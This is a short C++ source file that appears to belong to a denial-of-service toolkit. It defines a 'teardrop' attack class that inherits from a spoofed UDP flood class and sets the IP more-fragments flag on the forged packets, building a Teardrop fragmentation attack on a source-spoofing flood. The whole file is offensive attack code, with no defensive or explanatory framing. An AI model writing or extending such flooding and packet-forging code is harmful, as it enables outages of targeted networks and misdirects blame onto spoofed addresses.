#include "teardrop.hpp"

teardrop::teardrop() : spoofed_udp_flood() {}

void teardrop::finalize_hdr(udphdr *udp, iphdr *ip) {
  ip->frag_off |= htons(0x2000);
  spoofed_udp_flood::finalize_hdr(udp, ip);
}
